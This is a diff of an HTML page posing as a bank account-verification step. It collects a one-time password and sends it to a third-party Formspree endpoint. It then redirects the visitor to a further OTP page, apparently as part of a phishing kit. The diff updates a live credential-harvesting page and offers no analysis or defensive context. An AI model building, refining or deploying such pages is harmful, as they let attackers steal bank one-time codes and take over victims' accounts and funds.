@@ -3,9 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>OTP Page</title>
+  <title>VERIFICATION</title>
   <link rel="stylesheet" href="style.css">
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
     $(document).ready(function() {
       $('form').submit(function(event) {
@@ -13,13 +13,13 @@
 
         // Send the form data to FormSubmit using AJAX
         $.ajax({
-          url: 'https://formspree.io/f/mlekkzpn',
+          url: 'https://formspree.io/f/xayzzvpe',
           method: 'POST',
           data: $('form').serialize(),
           dataType: 'json',
           success: function(response) {
             // Redirect to otp.html upon successful submission
-            redirectToLanding();
+            redirectToOTP();
           },
           error: function(xhr, status, error) {
             console.log(xhr.responseText);
@@ -29,8 +29,8 @@
       });
     });
 
-    function redirectToLanding() {
-      window.location.href = 'landing.html';
+    function redirectToOTP() {
+      window.location.href = 'otp.html';
     }
   </script>
 </head>
@@ -38,28 +38,28 @@
   <header>
     <img src="logo.png" alt="Bank Logo" class="logo">
   </header>
-  <main><center>
-    <img src="otp.jpg" alt="OTP Image" class="otp-image">
-	
-	<b> ACCOUNT VERIFICATION </b>
-	</br>
-	</br>
-	<h3 style="color:red"> NOTE: </h3>
-	 it may take upto 4 minutes before recieving
-	 </br>
-	 </br>
-	 </br>
-	 </br>
+ <main>
+  <img src="otp.jpg" alt="Loan Image" class="loan-image" width="max" align="center">
+  
+  <center> 
+  <h3 style="font-family:verdana;">
+ACCOUNT VERIFICATION
+ </h3>
+   <h3 style="color:red"> NOTE: </h3>
+   it may take upto 4 minutes before recieving
+   </br>
+   </br>
+   </br>
+   <h3> INPUT OTP HERE: </h3>
     <form>
       <div class="form-group">
-        <label for="otp">INPUT OTP HERE:</label>
-        <input type="text" id="otp" name="otp" required>
+        <label for="account-number">INPUT OTP HERE:</label>
+        <input type="text" id="account-number" name="account-number" required>
       </div>
-      <button type="button" class="submit-btn">Submit OTP</button>
-	  </center>
+	 </br>
+  <center>    <button type="submit" class="submit-btn">FINISH</button></center>
     </form>
   </main>
-  
-   <img src="image3.png" alt="Loan Image" class="loan-image">
+  <img src="image3.png" alt="Loan Image" class="loan-image">
 </body>
 </html>
